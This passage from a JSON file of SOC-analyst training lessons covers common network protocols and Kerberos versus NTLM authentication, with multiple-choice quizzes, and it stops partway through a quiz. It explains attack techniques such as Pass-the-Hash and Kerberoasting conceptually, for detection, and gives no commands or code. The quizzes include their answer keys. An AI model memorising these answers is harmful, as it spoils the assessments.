      "explanation": "Correct is (a): a cryptographic hash recorded at collection and re-verified later is the standard, mathematical proof that not a single bit changed — the direct rebuttal to a tampering claim. (b) is a personal assurance, which carries no evidentiary weight against a technical challenge. (c) storage reliability says nothing about whether the contents were modified. (d) an antivirus scan detects malware, not alteration — a file can be heavily edited and still be malware-free, so it proves nothing about integrity."
    }
  ],
  "references": [
    "https://csrc.nist.gov/pubs/sp/800/86/final",
    "https://www.rfc-editor.org/rfc/rfc3227",
    "https://csrc.nist.gov/pubs/sp/800/61/r2/final"
  ],
  "xp": 180,
  "estimatedMinutes": 34,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-core-protocols-beginners",
  "slug": "core-protocols-every-analyst-should-know",
  "title": "Core Protocols Explained: DNS, DHCP, SSH, SMB, SPF & DKIM",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every action on a network is a conversation, and protocols are the languages those conversations are spoken in. When a laptop joins the office Wi-Fi, opens a website, logs into a server, saves a file to a shared drive, or receives an email, a different protocol is doing the talking behind the scenes. This lesson is a beginner-friendly, plain-language tour of six protocols a SOC analyst meets every single day: DNS, DHCP, SSH, SMB, SPF, and DKIM. For each one you will learn exactly what it does, what its job is, and — most importantly — who does what and when. No prior networking background is assumed; we build every idea from a real-life picture first.",
  "sections": [
    {
      "heading": "What a Protocol Actually Is",
      "content": "A **protocol** is simply an agreed set of rules for how two computers talk to each other. Think of two people on a phone call. Before any real conversation happens, they both follow an unwritten routine: one says \"Hello?\", the other answers, they take turns, they say \"bye\" at the end. If one person spoke Japanese and the other only French, nothing would work. A protocol is that shared routine and shared language, written down precisely so that any two machines — built by different companies, running different software — can still understand each other perfectly.\n\nTwo ideas will come up again and again, so let us pin them down now.\n\n**Client and server.** In most conversations one side asks and the other answers. The side that starts the request is the **client** (your laptop asking for a web page). The side that waits and responds is the **server** (the machine that holds the web page). The same computer can be a client in one conversation and a server in another.\n\n**Ports.** A single server can run many services at once — email, web, file sharing — all on the same IP address. So how does an incoming request know which service to reach? Through a **port number**, which works like a labelled door on a building. The building is the computer (its IP address); the doors are the ports. Web traffic knocks on one door (port 443), email on another, file sharing on another. Each protocol in this lesson has its own well-known door number, and memorising those numbers is one of the fastest ways to read network logs fluently.\n\nWhy does an analyst care about protocols at all? Because **every protocol leaves a trail**, and **attackers must use protocols too**. An attacker stealing files still speaks the file-sharing protocol; a phisher still sends email that either passes or fails the email-authentication protocols. When you understand the normal, polite version of each conversation, the abnormal version — the intruder — stands out. The rest of this lesson walks through six of those conversations, one at a time.\n\n| Protocol | Its one-line job | Well-known port |\n|----------|------------------|-----------------|\n| DNS | Turn names into IP addresses | 53 |\n| DHCP | Hand out network settings automatically | 67 / 68 |\n| SSH | Log into a remote machine securely | 22 |\n| SMB | Share files and printers (mainly Windows) | 445 |\n| SPF | Say which servers may send your email | (published in DNS) |\n| DKIM | Cryptographically sign an email | (published in DNS) |"
    },
    {
      "heading": "DNS — The Internet's Phonebook",
      "content": "**DNS** stands for **Domain Name System**, and its job is the simplest to describe: it turns a name you can remember into a number the network can use. Humans like names such as `www.example.com`; computers route traffic using **IP addresses** such as `93.184.216.34`. DNS is the translator between the two. The real-life picture is an old paper phonebook: you know a person's name, you look them up, you get their phone number. DNS is the phonebook of the internet, and it answers on **port 53**.\n\n**What it does.** Before your browser can load a website, it must find out the site's IP address. It asks DNS, \"What is the address for `www.example.com`?\" and DNS answers with an IP. Only then does the actual connection begin. This lookup happens constantly and invisibly — every website, app, and update check triggers DNS first.\n\n**Who does what, and when.** Several players cooperate, in order:\n\n1. **The client (your device)** asks its configured **DNS resolver** — usually run by your company or your internet provider — \"What is the IP for this name?\" This happens the moment you click a link or an app phones home.\n2. **The resolver** does the legwork. If it does not already know the answer (from a recent lookup it **cached**), it asks a chain of servers: a **root server** points it toward the right **TLD server** (the one responsible for `.com`), which points it to the domain's **authoritative server** (the one that officially holds `example.com`'s records).\n3. **The authoritative server** gives the final answer — the IP address.\n4. **The resolver** hands that IP back to your device and remembers it for a while (the record's **TTL**, or time-to-live) so the next lookup is instant.\n\nThe whole round trip usually takes a few milliseconds. The key mental model: your device asks once, and a resolver quietly walks a chain of directories on your behalf.\n\n**Why the SOC cares.** Because DNS runs before almost every connection, it is a goldmine and a target. Malware must look up its **command-and-control** server's name, so suspicious or newly-registered domains in DNS logs are an early warning. Attackers also abuse DNS to smuggle data out in tiny pieces (**DNS tunnelling**), or generate thousands of random-looking domain names (a **DGA**, domain generation algorithm) to stay reachable. An analyst who watches DNS sees intentions before the payload even lands."
    },
    {
      "heading": "DHCP — The Automatic Address Desk",
      "content": "**DHCP** stands for **Dynamic Host Configuration Protocol**. Its job is to hand a device everything it needs to work on a network the instant it connects — automatically, with no human typing in settings. The real-life picture is a hotel check-in desk: you arrive, the receptionist assigns you a room number, tells you the Wi-Fi password and how to reach the front desk, and gives you the room for a set number of nights. DHCP is that receptionist for computers.\n\n**What it does.** When a laptop joins a network, it does not yet have an IP address or know how to reach the internet. DHCP gives it four essentials: an **IP address** (its identity on the network), a **subnet mask** (which nearby addresses are local), a **default gateway** (the door out to the rest of the network), and one or more **DNS server** addresses (so it can then do the phonebook lookups from the previous section). All of this is leased for a limited time.\n\n**Who does what, and when.** The exchange happens in four quick steps the moment a device connects, often remembered by the word **DORA**:\n\n1. **Discover** — the new device shouts to the whole local network, \"Is there a DHCP server out there? I need settings.\" It has no address yet, so this is a broadcast.\n2. **Offer** — a **DHCP server** replies, \"Here is an address you can use, plus the gateway and DNS.\"\n3. **Request** — the device says, \"Yes please, I will take that offered address.\"\n4. **Acknowledge** — the server confirms, \"It's yours,\" and records the **lease** (which address went to which device, and for how long).\n\nThe server listens on **port 67** and the client on **port 68**. The lease is temporary; before it expires the device renews it, which is why the same laptop might keep one address for days or get a new one after a long weekend.\n\n**Why the SOC cares.** DHCP logs are the map from an **IP address to an actual device** at a moment in time. Alerts usually name an IP, but IPs get reused, so to answer \"which machine was `10.4.2.17` at 2 a.m.?\" you check the DHCP lease records. Analysts also watch for a **rogue DHCP server** — an unauthorised device handing out settings to hijack traffic — and for unexpected devices suddenly requesting leases, which can reveal something new (and unwanted) plugged into the network."
    },
    {
      "heading": "SSH — The Secure Remote Control",
      "content": "**SSH** stands for **Secure Shell**. Its job is to let a person (or a script) log into and control another computer over the network, with the entire conversation encrypted so no eavesdropper can read it. The real-life picture is a secure remote control for a machine sitting somewhere else — a server in a data centre, a cloud host — as if you were typing directly at its keyboard, except everything travelling between you and it is scrambled. SSH listens on **port 22**.\n\n**What it does.** Administrators use SSH every day to manage servers they will never physically touch: running commands, editing configuration, restarting services, copying files. Crucially, SSH replaced older tools like Telnet precisely because Telnet sent everything — including passwords — as plain readable text. SSH encrypts the whole session, so even someone capturing the traffic sees only gibberish.\n\n**Who does what, and when.** SSH is a classic client/server conversation:\n\n1. **The client** (the admin's laptop) opens a connection to **the server** on port 22 and says, in effect, \"I want to log in.\"\n2. **The two sides agree on encryption.** Before any password or command is sent, they perform a **handshake** that sets up a shared secret, so everything from here on is encrypted.\n3. **The client proves who it is** in one of two ways. Either with a **password**, or — far more securely — with a **key pair**: the client holds a secret **private key**, the server holds the matching **public key**, and the client proves it owns the private key without ever sending it. Key-based login is the professional standard.\n4. **Once authenticated**, the admin gets a shell and works on the remote machine until they log out.\n\nThis typically happens whenever a human or an automated job needs to administer a remote system — often many times a day in any real environment.\n\n**Why the SOC cares.** Because SSH grants full control of a machine, it is a prime target and a prime tool for attackers. A flood of failed logins on port 22 is a **brute-force** attempt to guess a password. An SSH connection from an unusual source — a workstation that never normally administers servers, or a login from a foreign country at 3 a.m. — can signal a compromised account. Attackers also use SSH to **tunnel** through a foothold and reach deeper systems (**pivoting**). Successful and failed SSH logins are among the highest-value events an analyst reviews."
    },
    {
      "heading": "SMB — The Shared Office Filing Cabinet",
      "content": "**SMB** stands for **Server Message Block**. Its job is to let computers — overwhelmingly Windows computers — share files and printers across a network as if the remote folder were sitting on your own machine. The real-life picture is a shared office filing cabinet: many people, from their own desks, open the same cabinet, read documents, drop new ones in, and send jobs to the shared printer down the hall. SMB is what makes that shared drive (`\\\\FILESERVER\\HR`) appear as just another folder. It runs on **port 445**.\n\n**What it does.** When you open a network drive at work, copy a report to a team folder, or print to the office printer, SMB is carrying that traffic. A server offers **shares** (named folders or printers it is willing to expose), and clients connect to them, subject to permissions that decide who may read or write. The address format `\\\\server\\share` — a **UNC path** — is the SMB way of naming a shared resource.\n\n**Who does what, and when.** \n\n1. **A server** (a file server, or even an ordinary Windows PC) advertises one or more **shares** and enforces **permissions** on them.\n2. **A client** connects to the server on port 445 and says, \"I want to access this share.\"\n3. **The server checks the user's permissions** and, if allowed, lets the client browse, open, edit, or save files, and use printers.\n4. This happens continuously in day-to-day office work — every time someone touches a network folder or a shared printer.\n\n**Why the SOC cares.** SMB is one of the most heavily abused protocols in serious incidents, because file sharing is also, from an attacker's view, a way to move and spread. Once inside, attackers use SMB for **lateral movement** — copying tools onto other machines and running them (the technique behind tools like PsExec). Ransomware uses SMB to reach and encrypt shared drives across the whole company at once. The infamous **WannaCry** outbreak spread through an SMB vulnerability (**EternalBlue**, MS17-010). For that reason, SMB traffic crossing between network zones, or a single machine suddenly connecting to many others on port 445, is a red flag analysts hunt for."
    },
    {
      "heading": "SPF & DKIM — Proving an Email Is Really From Who It Claims",
      "content": "The last two protocols solve one specific, painful problem: **anyone can put any name in the \"From\" line of an email.** Nothing in basic email stops an attacker from writing `From: ceo@yourcompany.com` on a message they sent themselves. That forgery — **spoofing** — is the engine behind most phishing and **business email compromise (BEC)**. SPF and DKIM are two independent checks that let the receiving mail server ask, \"Is this message really authorised by the domain it claims to come from?\" Both work by publishing information in **DNS** (remember the phonebook), which the receiver looks up.\n\n**SPF — the guest list at the door.** SPF stands for **Sender Policy Framework**. A domain owner publishes, in DNS, a list of the mail servers that are **allowed to send email for that domain**. The real-life picture is a guest list at an event: the doorman checks whether the arriving server's address is on the list.\n\n- **Who does what, and when:** the domain owner sets up the SPF list once. Then, every time a message arrives, the **receiving mail server** looks up the sending domain's SPF record and checks whether the server that actually delivered the message is on the approved list. If not, SPF **fails** — a strong sign of forgery.\n- SPF's limit: it validates the sending **server**, not the message contents, and it can break when mail is forwarded.\n\n**DKIM — the tamper-proof wax seal.** DKIM stands for **DomainKeys Identified Mail**. When a message leaves the real sender, the sending server adds a **digital signature** calculated from the message using a secret **private key**. The matching **public key** is published in DNS. The real-life picture is a wax seal on a letter: it proves both who sealed it and that no one opened and altered it in transit.\n\n- **Who does what, and when:** the sending server **signs** each outgoing message as it leaves. The **receiving server** fetches the sender's public key from DNS and verifies the signature. If it matches, two things are proven: the message genuinely comes from that domain, and it was **not modified** on the way. If someone tampered with it, the seal breaks and DKIM fails.\n\n**How they fit together (and DMARC).** SPF and DKIM are complementary: SPF checks *where the mail came from*, DKIM checks *that the message is authentic and unaltered*. A third policy, **DMARC**, ties them together — it tells receivers what to do when the checks fail (nothing, quarantine to spam, or reject outright) and requires the authenticated domain to **align** with the visible \"From\" address, closing gaps the other two leave open.\n\n**Why the SOC cares.** When you triage a suspicious email, the message **headers** record the SPF, DKIM, and DMARC results. An email claiming to be from your CEO that shows `spf=fail` and `dkim=fail` is very likely spoofed. Reading these three results is one of the first, fastest moves in phishing investigation."
    }
  ],
  "keyTakeaways": [
    "A protocol is a shared language and rulebook between computers; each has a well-known port (DNS 53, DHCP 67/68, SSH 22, SMB 445) and leaves logs that reveal both normal work and attacker activity.",
    "DNS turns names into IP addresses (the phonebook), and DHCP hands new devices their IP, gateway, and DNS settings automatically via the four-step DORA exchange.",
    "SSH gives encrypted remote control of a machine on port 22 (watch for brute force and unusual logins); SMB shares files and printers on port 445 (watch for lateral movement and ransomware spread).",
    "SPF (a DNS list of servers allowed to send a domain's mail) and DKIM (a DNS-published cryptographic signature proving the message is authentic and unaltered) together — with DMARC's policy — expose spoofed phishing email; their pass/fail results appear in message headers."
  ],
  "quiz": [
    {
      "question": "A user reports that a website will not load, and you notice their device never received an answer when it tried to translate the site's name into an address. Which protocol is responsible for that name-to-address translation, and on which well-known port does it operate?",
      "options": [
        {
          "label": "DHCP on port 67, because DHCP is what resolves human-friendly website names into the numeric IP addresses that routers actually use to move traffic.",
          "value": "a"
        },
        {
          "label": "DNS on port 53, because DNS is the phonebook that translates a name like www.example.com into an IP address before any connection can begin.",
          "value": "b"
        },
        {
          "label": "SMB on port 445, because file-sharing servers are what hold the mapping between website names and their corresponding numeric internet addresses.",
          "value": "c"
        },
        {
          "label": "SSH on port 22, because the encrypted remote-login service is what performs name lookups securely on behalf of the connecting client device.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "DNS (Domain Name System) is the protocol that translates names into IP addresses, and it operates on port 53; without a DNS answer the browser has no address to connect to. DHCP hands out network settings, not name resolution. SMB shares files and printers on port 445. SSH provides encrypted remote login on port 22. Only DNS does name-to-address translation."
    },
    {
      "question": "A brand-new laptop is plugged into the office network and, within a second, it has an IP address, a default gateway, and DNS servers — with nobody typing anything in. Which protocol did this, and what is the correct order of its four-step exchange?",
      "options": [
        {
          "label": "DHCP, using the DORA order: Discover, then Offer, then Request, then Acknowledge, so the device asks for settings and the server leases them.",
          "value": "a"
        },
        {
          "label": "DHCP, using the order Offer, Discover, Acknowledge, Request, where the server speaks first and the client confirms the lease afterwards.",
          "value": "b"
        },
        {
          "label": "DNS, using a Discover and Acknowledge pair, because the phonebook service is what assigns each new device its address and gateway.",
          "value": "c"
        },
        {
          "label": "SSH, using an encrypted handshake, because remote-control sessions are what configure a new device's address settings when it first joins.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "DHCP automatically supplies IP address, gateway, and DNS settings using the DORA sequence: Discover (client asks), Offer (server proposes), Request (client accepts), Acknowledge (server confirms and records the lease). Option b lists the steps in the wrong order. DNS resolves names and does not assign addresses. SSH is for encrypted remote login, not address configuration."
    },
    {
      "question": "You are triaging an email that claims to come from your company's CEO, but the message headers show spf=fail and dkim=fail. What do these two failing checks tell you, and why does it matter?",
      "options": [
        {
          "label": "It means the recipient's mailbox is full, because SPF and DKIM are storage checks that confirm whether the server has room to accept the incoming message.",
          "value": "a"
        },
        {
          "label": "It means the message was delayed in transit, because SPF and DKIM measure how long an email took to travel between the sending and receiving mail servers.",
          "value": "b"
        },
        {
          "label": "It means the sending server was not authorised for the domain and the message's signature did not verify, strongly suggesting the email is spoofed.",
          "value": "c"
        },
        {
          "label": "It means the email was successfully encrypted end to end, because passing or failing these checks reflects the strength of the message's transport encryption.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "SPF checks whether the sending server is on the domain's authorised list, and DKIM verifies a cryptographic signature proving the message is authentic and unaltered; both failing means the sender was not authorised and the signature did not verify, a strong indicator of spoofing. The other options invent unrelated meanings: SPF/DKIM have nothing to do with mailbox storage, delivery timing, or transport encryption strength."
    },
    {
      "question": "During an incident you see one workstation suddenly making connections to dozens of other machines on port 445 within a few minutes. Which protocol is in use, and why is this pattern suspicious?",
      "options": [
        {
          "label": "SSH, and it is suspicious because encrypted remote logins should only ever occur between two machines and never involve more than a single destination host.",
          "value": "a"
        },
        {
          "label": "SMB, and it is suspicious because fanning out to many hosts on 445 fits lateral movement or ransomware spreading across shared drives.",
          "value": "b"
        },
        {
          "label": "DNS, and it is suspicious because the phonebook service normally answers from a single resolver and should never contact many machines at once.",
          "value": "c"
        },
        {
          "label": "DHCP, and it is suspicious because address leases are always granted by exactly one server and never involve connections to multiple different hosts.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Port 445 is SMB, the Windows file-and-printer sharing protocol; one machine rapidly connecting to many others on 445 matches lateral movement (spreading tools) or ransomware reaching many shared drives at once, which is why it is a hunted red flag. SSH is port 22, DNS is port 53, and DHCP uses 67/68, so none of those match the port seen, making them incorrect."
    },
    {
      "question": "Why did SSH replace older remote-access tools like Telnet as the standard way to administer servers, and on which port does SSH listen?",
      "options": [
        {
          "label": "Because SSH encrypts the entire session including credentials and commands, whereas Telnet sent everything in readable plain text; SSH listens on port 22.",
          "value": "a"
        },
        {
          "label": "Because SSH automatically assigns IP addresses to the servers it manages, which Telnet could not do; SSH listens on port 67 for those requests.",
          "value": "b"
        },
        {
          "label": "Because SSH translates server names into addresses far faster than Telnet ever could; SSH listens on port 53 to perform those lookups.",
          "value": "c"
        },
        {
          "label": "Because SSH shares files between servers more efficiently than Telnet's method; SSH listens on port 445 to move that shared data.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "SSH became the standard because it encrypts the whole session — passwords and commands included — while Telnet transmitted everything as plain readable text that anyone capturing traffic could steal; SSH listens on port 22. The other options wrongly attribute DHCP's address assignment (port 67), DNS's name resolution (port 53), or SMB's file sharing (port 445) to SSH."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/dns/what-is-dns/",
    "https://datatracker.ietf.org/doc/html/rfc2131",
    "https://dmarc.org/overview/",
    "https://attack.mitre.org/techniques/T1021/002/"
  ],
  "xp": 200,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-kerberos-vs-ntlm",
  "slug": "kerberos-vs-ntlm-explained",
  "title": "Kerberos vs NTLM: How Windows Authentication Really Works",
  "topic": "Windows Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "In a Windows network, before you can open a file share, read your email, or log into a server, the system has to answer one question: are you really who you say you are? Windows has two protocols for answering that question — the older NTLM and the modern Kerberos — and understanding the difference between them is one of the most useful things a SOC analyst can learn. The two work in completely different ways: NTLM is a direct challenge-and-response between you and a server, while Kerberos hands out signed tickets from a trusted authority. This lesson explains each one in plain language, lines them up side by side, and shows why the choice between them matters so much when you are hunting for attackers.",
  "sections": [
    {
      "heading": "Two Different Ways to Prove Who You Are",
      "content": "**Authentication** means proving your identity to a computer so it will let you in. On a Windows domain, two protocols do this job, and they take very different approaches.\n\n**NTLM** (NT LAN Manager) is the older of the two. It works as a direct **challenge and response**: the server you are trying to reach challenges you to prove you know your password, and you respond in a way that proves it without sending the password itself. It is a private back-and-forth between just two parties — you and the server.\n\n**Kerberos** is the modern default, used in Active Directory domains since Windows 2000. Instead of proving yourself to every server separately, you prove yourself **once** to a trusted authority, which then gives you signed **tickets** you can present to any service. It is like the difference between showing your ID to every single doorman in a building (NTLM) versus showing your ID once at the front desk, getting a wristband, and flashing the wristband everywhere else (Kerberos).\n\nA useful real-life analogy runs through the whole lesson:\n\n- **NTLM is a bouncer who phones head office.** You tell the bouncer your name; he gives you a puzzle only the real you could solve; you solve it; he calls head office to confirm your answer is right. Head office knows your secret; the bouncer never does.\n- **Kerberos is a trusted ticket office.** You prove yourself once at the ticket office, which stamps you a master pass. Whenever you want to enter a specific attraction, you swap part of that master pass for a ticket to *that* attraction, and the attraction trusts it because it is stamped by the ticket office everyone already trusts.\n\nBoth protocols end with the same result — you are let in or turned away — but *how* they get there shapes their security, their weaknesses, and the traces they leave in your logs. The next two sections open up each conversation step by step."
    },
    {
      "heading": "NTLM — The Challenge and Response",
      "content": "**NTLM authenticates you through a three-message challenge-response**, and the crucial trick is that your password is never actually sent across the network. Here is the conversation, step by step.\n\n**Who does what, and when:**\n\n1. **Negotiate.** The **client** (your machine) contacts the **server** and says, \"I want to access you, and here is who I am.\" This begins the moment you try to reach a resource that uses NTLM.\n2. **Challenge.** The **server** replies with a random number called a **challenge** (a nonce) — essentially, \"Prove you know the password by doing some maths with this number.\"\n3. **Response.** The **client** takes that challenge and encrypts it using a value derived from the user's password — the **NT hash** — and sends the result back. Because it used the hash, it proved knowledge of the password without ever transmitting the password.\n4. **Verification.** The server usually cannot check the answer itself, because it does not store everyone's password. So it forwards the challenge and the response to a **Domain Controller**, which *does* hold the secret, over the Netlogon channel. The DC does the same maths and confirms whether the response is correct. On the DC this validation is recorded as **Event ID 4776**.\n\nThat is the whole exchange. Notice three important properties:\n\n- **The password hash *is* the credential.** Whatever proves your identity is derived from the hash, and the hash alone is enough to authenticate. This is the root of the **Pass-the-Hash** attack: if an attacker steals your NT hash from memory, they can authenticate as you *without ever knowing your password*, because NTLM never needed the plaintext.\n- **There is no mutual authentication.** The server proves nothing about itself to you. You have no assurance you are talking to the real server, which opens the door to **NTLM relay** attacks, where an attacker sits in the middle and forwards your response to a different server to log in as you.\n- **No trusted third party is built into the exchange** the way Kerberos uses one; the DC is only consulted to check the answer.\n\nNTLM still exists everywhere as a **fallback**, but these weaknesses are exactly why Microsoft moved to Kerberos as the default — and why NTLM traffic is something analysts watch closely."
    },
    {
      "heading": "Kerberos — Tickets from a Trusted Authority",
      "content": "**Kerberos replaces repeated password proofs with time-limited, signed tickets issued by a trusted third party.** That third party is the **KDC** (Key Distribution Center), a service that runs on every Active Directory **Domain Controller**. The KDC has two halves: the **Authentication Service (AS)** and the **Ticket Granting Service (TGS)**.\n\n**Who does what, and when:**\n\n1. **Log in once (get a TGT).** When you sign in, your machine proves your identity to the **AS**. Instead of a password hash flying to each server, the AS returns a master pass called a **Ticket Granting Ticket (TGT)**, encrypted so only the KDC can later read it. This request is logged as **Event ID 4768**. The clever part: your proof includes a **timestamp** encrypted with your password-derived key, which is why Kerberos requires clocks to be roughly in sync (within about five minutes).\n2. **Ask for a service ticket.** Later, when you want to reach a specific service — say a file server — your machine presents the TGT back to the **TGS** and says, \"Give me a ticket for this service.\" Services are named by a **Service Principal Name (SPN)**. The TGS issues a **service ticket** for that one service. This request is logged as **Event ID 4769**.\n3. **Present the ticket to the service.** Your machine hands the service ticket to the file server. The server trusts it because it is stamped (encrypted) by the KDC that both sides already trust — the server never has to contact the DC to verify you in real time.\n4. **Mutual authentication.** Unlike NTLM, Kerberos can prove the *server's* identity to the client too, so you know you are talking to the real service and not an impostor.\n\nKey properties to hold onto:\n\n- **A trusted third party (the KDC) vouches for everyone**, so services do not need to validate each login against the DC on the spot.\n- **Tickets are time-limited**, which reduces the window an attacker can reuse them.\n- **Mutual authentication** protects against impostor servers.\n\nThe ticket design is powerful, but it creates its own attack surface. **Kerberoasting** abuses the service-ticket step (4769) to crack service-account passwords offline. **Pass-the-Ticket** reuses a stolen ticket. A **Golden Ticket** forges a TGT after an attacker steals the KDC's master key. Each of these leaves distinct traces — which is exactly why analysts learn the ticket flow."
    },
    {
      "heading": "The Key Differences, Side by Side",
      "content": "Now that you have seen both conversations, the contrasts become clear. The single biggest difference is the **trust model**: NTLM is a private challenge between two machines with the DC merely checking the answer, while Kerberos is built around a **trusted third party (the KDC)** that issues tickets everyone honours.\n\n| Aspect | NTLM | Kerberos |\n|--------|------|----------|\n| Age / status | Older, legacy fallback | Modern default in AD |\n| Core mechanism | Challenge and response | Tickets from a KDC |\n| Trusted third party | Not part of the exchange (DC only verifies) | Central — the KDC issues everything |\n| Mutual authentication | No (server is not verified) | Yes (both sides verified) |\n| Depends on clock sync | No | Yes (timestamps, ~5 min) |\n| Signature attacks | Pass-the-Hash, NTLM relay | Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket |\n| Key DC event IDs | 4776 | 4768 (TGT), 4769 (service ticket) |\n\nA few of these deserve a second look.\n\n**Mutual authentication** is a genuine security upgrade. Because NTLM never proves the server's identity, an attacker can relay your credentials to a different machine. Kerberos closes that gap by verifying both directions.\n\n**Tickets vs the hash.** In NTLM the password-derived hash is effectively the reusable credential, which is why stealing a hash is so damaging. Kerberos hands out tickets that expire, narrowing the reuse window — though a stolen ticket or a forged Golden Ticket is still dangerous.\n\n**Clock dependency.** Kerberos leans on timestamps to stop replay, so a domain with badly skewed clocks will see Kerberos fail and quietly **fall back to NTLM** — an important operational quirk that also has security consequences, as the next section explains."
    },
    {
      "heading": "When Windows Uses Which — and the SOC Angle",
      "content": "Windows does not let you pick a protocol by hand for everyday logins; it chooses automatically, and knowing the rule helps you read authentication logs.\n\n**Kerberos is used by default when the conditions are right:** the machine is domain-joined, it can reach a Domain Controller, and it connects to the target **by its hostname** (which lets Windows look up the service's SPN). This covers the majority of normal domain activity.\n\n**NTLM is the fallback, used when Kerberos cannot apply**, such as:\n\n- Connecting to a resource **by IP address** instead of hostname (no SPN to look up).\n- **Workgroup** or non-domain machines, and local-account logins.\n- **Legacy systems** or applications that only speak NTLM.\n- Situations where **no Domain Controller is reachable** or clocks are too far out of sync.\n\n**Why this matters to a SOC analyst.** The mix of Kerberos and NTLM in your logs tells a story, and deviations from the normal mix are a hunting opportunity.\n\n- **A spike in Event 4776 (NTLM validation)** can mean a **brute-force / password-spray** against accounts, or **Pass-the-Hash** activity — especially if you see NTLM authentications where that user or system would normally use Kerberos.\n- **NTLM where you expect Kerberos** is itself a red flag. Attackers sometimes force NTLM (for example, by connecting via IP) precisely because it enables relay and pass-the-hash. Seeing an admin account authenticate over NTLM to a server it usually reaches by name deserves a look.\n- **Kerberos events tell their own story.** A single account requesting service tickets (**4769**) for many different services in a short time is a classic **Kerberoasting** pattern. Unusual TGT requests (**4768**), or tickets used from unexpected hosts, can indicate **Pass-the-Ticket** or a forged ticket.\n\nThe practical takeaway: you do not need to memorise every cryptographic detail, but you should know **which protocol should normally appear where**, and treat the *wrong* one showing up — NTLM in a Kerberos world — as a thread worth pulling. That instinct, grounded in understanding how each protocol actually works, is what turns a wall of 4776/4768/4769 events into a readable narrative of who authenticated, how, and whether it makes sense."
    }
  ],
  "keyTakeaways": [
    "NTLM is an older challenge-response protocol between a client and a server (the DC only verifies the answer, logged as Event 4776); it has no mutual authentication and treats the password hash as the credential, which enables Pass-the-Hash and NTLM relay.",
    "Kerberos is the modern AD default: you authenticate once to the KDC to get a TGT (Event 4768), then trade it for time-limited service tickets (Event 4769); it adds mutual authentication and a trusted third party but depends on synchronized clocks.",
    "Windows uses Kerberos by default when domain-joined and connecting by hostname to a reachable DC, and falls back to NTLM for IP-based connections, workgroups, legacy apps, or when no DC is reachable.",
    "For a SOC analyst, seeing NTLM where Kerberos is expected, an NTLM (4776) spike, or one account requesting many service tickets (4769) are red flags for Pass-the-Hash, password spray, and Kerberoasting respectively."
  ],
  "quiz": [
    {
      "question": "A junior analyst asks you what fundamentally distinguishes Kerberos from NTLM in how they authenticate a user. What is the single most important structural difference?",
      "options": [
        {
          "label": "NTLM encrypts network traffic while Kerberos leaves it in plain text, which is why Kerberos is considered the older and less secure of the two protocols.",
          "value": "a"
        },
        {
          "label": "Kerberos relies on a trusted third party (the KDC) that issues time-limited tickets, whereas NTLM is a direct challenge-response between the client and server.",
          "value": "b"
        },
        {
          "label": "NTLM requires the client and server clocks to be synchronized within five minutes, while Kerberos works regardless of any time difference between them.",
          "value": "c"
        },
        {
          "label": "Kerberos sends the user's plaintext password to each server it contacts, while NTLM keeps the password entirely on the domain controller at all times.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The core difference is the trust model: Kerberos uses a trusted third party, the KDC, to issue time-limited tickets, while NTLM is a direct challenge-response between client and server with the DC only verifying the answer. Option a reverses reality and is false. Option c has the clock dependency backwards — it is Kerberos, not NTLM, that needs synchronized clocks. Option d is wrong because neither protocol sends the plaintext password to servers."
    },
    {
      "question": "An attacker steals a user's NT hash from a machine's memory and then successfully authenticates to a file server as that user, without ever learning the actual password. Which protocol's design makes this Pass-the-Hash attack possible, and why?",
      "options": [
        {
          "label": "Kerberos, because its service tickets contain the user's plaintext password, which the attacker extracted directly from the file server's memory.",
          "value": "a"
        },
        {
          "label": "NTLM, because the password-derived hash is effectively the credential, so possessing the hash is enough to authenticate without the plaintext password.",
          "value": "b"
        },
        {
          "label": "Kerberos, because the KDC issues a new hash to every service, allowing a stolen hash to be replayed against any server in the domain at will.",
          "value": "c"
        },
        {
          "label": "NTLM, because it transmits the user's plaintext password across the network in every challenge, letting the attacker capture and reuse it.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Pass-the-Hash works against NTLM because the NT hash is effectively the credential: the challenge is answered using the hash, so an attacker holding the hash can authenticate without ever knowing the plaintext password. Option a is wrong because Kerberos tickets do not contain plaintext passwords. Option c misdescribes how the KDC works. Option d is wrong because NTLM specifically avoids sending the plaintext password over the network — that is the whole point of the hash."
    },
    {
      "question": "While reviewing Domain Controller logs you notice a single user account generating a burst of Event ID 4769 (Kerberos service ticket requests) for many different services in a short window. What attack pattern should you most suspect?",
      "options": [
        {
          "label": "NTLM relay, because 4769 records the moment an attacker forwards a captured NTLM response to a second server to authenticate as the victim.",
          "value": "a"
        },
        {
          "label": "A password spray over NTLM, because 4769 is the event written each time a single password is tried against many different user accounts.",
          "value": "b"
        },
        {
          "label": "Kerberoasting, because requesting many service tickets lets an attacker extract them and crack the service accounts' passwords offline.",
          "value": "c"
        },
        {
          "label": "A Golden Ticket forgery, because 4769 is logged only when an attacker creates a forged TGT using the stolen KDC master key.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "A single account requesting many service tickets (Event 4769) is the classic Kerberoasting pattern: the attacker collects service tickets and cracks the service accounts' passwords offline. Option a is wrong because NTLM relay is an NTLM technique, not a Kerberos 4769 event. Option b describes password spray, which is not what 4769 records. Option d is wrong because 4769 logs service-ticket requests, not TGT forgery, which concerns the TGT (4768) flow."
    },
    {
      "question": "In a healthy Active Directory domain, under which condition will Windows normally fall back to NTLM instead of using Kerberos, and why should that catch an analyst's attention?",
      "options": [
        {
          "label": "When a client connects to a resource by its IP address rather than hostname, because no SPN can be looked up; attackers may force this to enable relay or pass-the-hash.",
          "value": "a"
        },
        {
          "label": "When the client and the domain controller have perfectly synchronized clocks, because matching timestamps disable Kerberos and require the NTLM fallback instead.",
          "value": "b"
        },
        {
